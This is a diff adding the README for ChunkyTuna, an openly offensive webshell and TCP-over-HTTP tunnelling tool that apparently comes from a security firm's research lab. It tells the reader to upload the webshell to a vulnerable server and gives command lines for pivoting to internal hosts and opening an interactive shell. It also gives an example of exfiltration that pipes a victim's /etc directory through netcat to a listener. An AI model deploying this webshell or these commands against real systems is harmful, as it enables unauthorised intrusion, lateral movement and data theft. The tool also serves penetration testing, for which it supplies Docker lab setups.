@@ -1,0 +1,114 @@
+# ChunkyTuna
+
+An evolved webshell user 'Chunked transfer encoding' HTTP providing:
+
+ * Tunneling of TCP streams over HTTP
+ * Interactive webshell with no reverse connections
+
+For details see [Secarma's blog](https://blog.secarma.co.uk/labs/chunkytuna-a-web-shell-evolved).
+
+Inspired by [Tunna](https://github.com/SECFORCE/Tunna/).
+
+Modalities:
+
+ *  Server connects to target directly ("Connect")
+ *  Server listens for connections from target ("Listen")
+ *  Server executes commands locally ("eXecute")
+
+## Requirements:
+
+ * A vulnerable webserver with file upload (JSP, PHP or ASPX)
+ * Python > 3.x
+
+For testing:
+
+ * Docker or Windows Server with IIS
+
+# Usage
+
+**IMPORTANT** Set a password so your webshell can only be used by you:
+
+ 1. Edit the python client `chunkytuna.py`, search for the first line starting with `PASSWORD`, and set a new password 
+ 2. Edit the webshell, search for the line containing `X-Pwd` and set the same password you set in the python client
+
+Then, upload the webshell on the vulnerable server.
+
+## Connect mode
+
+Mode 'C': webshell *connects* to the target:
+
+	./chunkytuna.py http://$WEBSERVER:$WEBPORT/$PATH_TO_WEBSHELL -r 127.0.0.1:12345 -t $TARGET:$TARGETPORT C
+
+Where:
+
+ * `$TARGET` and `$TARGETPORT` are the system in the same network as the webserver, e.g. 192.168.1.42:80
+ * `$WEBSERVER` and `$WEBPORT` are self-explanatory
+ * `$PATH_TO_WEBSHELL` is the path to the uploaded file e.g. `/webapps/foo/bar/chunkytuyna.jsp`
+ * The `C` stands for connect
+
+Then connect to `localhost:12345` with e.g. a web browser, ssh client, etc; the connection will be encapsulated over HTTP and sent to `$TARGETPORT` on $TARGET`.
+
+[Demo](https://youtu.be/gV3TIKi_ewg)
+
+## Listening mode (for exfil etc.)
+
+Mode 'L': webshell *listens* for connections from a target:
+
+	./chunkytuna.py http://$WEBSERVER:$WEBPORT/$PATH_TO_WEBSHELL -r 127.0.0.1:1234 -t 0.0.0.0:12345 L
+ 
+Where:
+
+ * `0.0.0.0:12345` is the port **on the remote web server**
+ 
+Requirement:
+
+ * The "internal" IP address of the webserver
+
+Then:
+
+ * Open a listener on port `1234`
+ * Have your victim connect to port 12345 of the webserver (that is the internal IP)
+
+Example:
+
+ * Listen with:
+
+	    mkdir -p exfil ; nc -lnvp 1234 | tar xf - -C exfil
+
+ * On the victim side run:
+
+	    tar cf - /etc | nc $WEBSERVER_INTERNAL_IP 12345
+
+[Demo](https://youtu.be/5Q_b5VU04lk)
+
+
+
+## Execution of commands
+
+Mode 'X': run commands on the webserver:
+
+	./chunkytuna.py http://$WEBSERVER:WEBPORT/$PATH_TO_WEBSHELL X -r 127.0.0.1:12345 -t /bin/sh
+
+Then connect to `localhost:12345` and enjoy a shell :)
+
+[Demo](https://youtu.be/7iVEV6pepR8)
+
+
+# Miscellanea
+
+## Docker stuff
+
+To test ChunkyTuna locally, use the Docker containers provided in each directory: `asp/Docker`, `jsp/Docker`, `php/Docker`. There's a convenience script called `build-and-run-docker.sh` that sets up the environment for you. 
+
+To find the IP of each container use `demo/get-container-ip.sh` followed by the name of the container (e.g. `target`, `listener-jsp`, `listener-php` etc.).
+
+To log on a Docker container to perform e.g. emergency maintenance or run netcat:
+
+    docker exec -it listener-jsp /bin/bash
+
+## Testing
+
+For unit testing, run:
+
+    python3 -m unittest
+
